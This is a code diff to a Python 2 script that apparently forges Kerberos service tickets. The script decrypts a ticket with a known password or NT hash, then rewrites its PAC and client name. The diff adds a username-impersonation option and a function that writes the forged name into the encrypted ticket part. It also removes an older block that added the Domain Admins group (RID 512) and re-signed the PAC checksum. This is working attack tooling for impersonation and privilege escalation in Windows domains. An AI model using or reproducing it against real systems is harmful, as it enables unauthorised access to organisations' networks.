@@ -50,6 +50,33 @@ def addgrouptopac(pac, grouprid):
 	pac_logon_info = pac[offset:offset+pacsize]
 	return pac
 
+def updateusernameinencpart(key, rawticket, username, debug=False, verbose=False):
+	try:
+		ramticket, extra = decoder.decode(rawticket)
+		serverticket = ramticket.getComponentByPosition(2)
+		localticket = ramticket.getComponentByPosition(3)
+		encserverticket = serverticket.getComponentByPosition(0).getComponentByPosition(3).getComponentByPosition(2).asOctets()
+	except:
+		raise ValueError('Unable to decode ticket. Invalid file.')
+	if verbose: print 'Ticket succesfully decoded'
+
+	decserverticketraw, nonce = kerberos.decrypt(key, 2, encserverticket)
+
+	a = decoder.decode(decserverticketraw)[0]
+	a[3][1][0]._value = username
+	e = encoder.encode(a)
+
+
+	newencserverticket = kerberos.encrypt(key, 2, e, nonce)
+
+
+	ramticket.getComponentByPosition(2).getComponentByPosition(0).getComponentByPosition(3).getComponentByPosition(2)._value = newencserverticket
+
+
+	return ramticket
+
+
+
 def getpac(key, rawticket, debug=False, verbose=False):
 	# attempt decoding of ticket
 	try:
@@ -79,18 +106,6 @@ def getpac(key, rawticket, debug=False, verbose=False):
 
 	adifrelevant, extra = decoder.decode(decserverticket[9][0][1])
 	pac = str(adifrelevant.getComponentByPosition(0).getComponentByPosition(1))
-
-
-	#print kerberos.chksum(key, '\x11\x00\x00\x00', pac).encode('hex')
-
-	# EDIT PAC HERE!!
-	# cheesy edit of the pac!
-	#pac = pac.replace('\x01\x02\x00\x00', '\x00\x02\x00\x00')
-
-	#print len(pac)
-	#print pac.encode('hex')
-
-	#pacobj = PAC.PAC(pac)
 
 	return pac
 
@@ -150,87 +165,6 @@ def updatepac(key, rawticket, pac, debug=False, verbose=False):
 
 	return encoder.encode(ramticket)
 
-'''
-def rewriteticket(key, rawticket, addgroups=None, debug=False, verbose=False):
-	# attempt decoding of ticket
-	try:
-		ramticket, extra = decoder.decode(rawticket)
-		serverticket = ramticket.getComponentByPosition(2)
-		localticket = ramticket.getComponentByPosition(3)
-		encserverticket = serverticket.getComponentByPosition(0).getComponentByPosition(3).getComponentByPosition(2).asOctets()
-	except:
-		raise ValueError('Unable to decode ticket. Invalid file.')
-	if verbose: print 'Ticket succesfully decoded'
-
-	decserverticketraw, nonce = kerberos.decrypt(key, 2, encserverticket)
-
-	if decserverticketraw == None:
-		raise ValueError('Unable to decrypt ticket. Invalid key.')
-	elif verbose:
-		print 'Decryption successful'
-
-	
-	decserverticket, extra = decoder.decode(decserverticketraw)
-	# have two here because I was using one to verify that the rewrite matched
-	# This stuff should be removed, if it is still here Tim forgot...again
-	origdecserverticket, extra = decoder.decode(decserverticketraw)
-
-	# change the validity times in the server ticket
-	updatetimestampsserverticket(decserverticket, str(decserverticket[5]), str(decserverticket[6]), str(decserverticket[7]), str(decserverticket[8]))
-
-	adifrelevant, extra = decoder.decode(decserverticket[9][0][1])
-	pac = str(adifrelevant.getComponentByPosition(0).getComponentByPosition(1))
-
-
-	#print kerberos.chksum(key, '\x11\x00\x00\x00', pac).encode('hex')
-
-	# EDIT PAC HERE!!
-	# cheesy edit of the pac!
-	#pac = pac.replace('\x01\x02\x00\x00', '\x00\x02\x00\x00')
-
-	#print len(pac)
-	#print pac.encode('hex')
-
-	pacobj = PAC.PAC(pac)
-	pacobj.PacLoginInfo.Groups.append(512)
-	pac = pacobj.encode()
-
-	#if pacorig != pac:
-	#	print 'NOTEQUAL'
-	#	print pacorig.encode('hex')
-	#	print pac.encode('hex')
-
-
-	#print len(pac)
-
-	#print pac.encode('hex')
-
-
-
-	# rebuild begins here
-	#print 'origchecksum: %s' % pac[-44:-28].encode('hex')
-	chksum = kerberos.chksum(key, '\x11\x00\x00\x00', pac)
-	#print 'newchecksum:  %s' %  chksum.encode('hex')
-
-	# repair server checksum
-	newpac = pac[:-44] + chksum + pac[-28:]
-	# rebuild AD-IF-RELEVANT
-	#print adifrelevant
-	#print dir(adifrelevant.getComponentByPosition(0).getComponentByPosition(1))
-	adifrelevant.getComponentByPosition(0).getComponentByPosition(1)._value = newpac
-	#print adifrelevant
-	decserverticket.getComponentByPosition(9).getComponentByPosition(0).getComponentByPosition(1)._value = encoder.encode(adifrelevant)
-
-
-	# put the ticket back together again
-	newencserverticket = kerberos.encrypt(key, 2, encoder.encode(decserverticket), nonce)
-	ramticket.getComponentByPosition(2).getComponentByPosition(0).getComponentByPosition(3).getComponentByPosition(2)._value = newencserverticket
-
-	#print decserverticket
-
-	return encoder.encode(ramticket)
-
-'''
 
 
 if __name__ == '__main__':
@@ -246,7 +180,7 @@ if __name__ == '__main__':
 	parser.add_argument('-p', '--password', dest='password', action='store', required=False, 
 					metavar='P@ss0rd1', type=str, 
 					help='the password used to decrypt/encrypt the ticket')
-	parser.add_argument('-n', '--nthash', dest='nthash', action='store', required=False, 
+	parser.add_argument('-t', '--nthash', dest='nthash', action='store', required=False, 
 					metavar='64F12CDDAA88057E06A81B54E73B949B', type=str, 
 					help='the hashed password used to decrypt/encrypt the ticket')
 	parser.add_argument('-g', '--group', dest='groups', action='append', required=False, 
@@ -255,6 +189,9 @@ if __name__ == '__main__':
 	parser.add_argument('-u', '--user', dest='userrid', action='store', required=False, 
 					metavar='500', type=int, 
 					help='user rid to impersonate')
+	parser.add_argument('-n', '--username', dest='username', action='store', required=False, 
+					metavar='yomom', type=str, 
+					help='user name to impersonate')
 	parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', required=False, 
 					default=False,
 					help='verbose')
@@ -297,8 +234,17 @@ if __name__ == '__main__':
 			if g not in pacobj.PacLoginInfo.Groups:
 				pacobj.PacLoginInfo.Groups.append(g)
 
+	if args.username:
+		pacobj.PacLoginInfo.AccountName = args.username.encode('utf-16le')
+		pacobj.PacLoginInfo.DisplayName = args.username.encode('utf-16le')
+		
+
 	pac = pacobj.encode()
 	newticket = updatepac(key, fullraw, pac)
+
+	if args.username:
+		updateusernameinencpart(key, newticket, args.username)
+
 
 	args.outfile.write(newticket)
 	args.outfile.close()
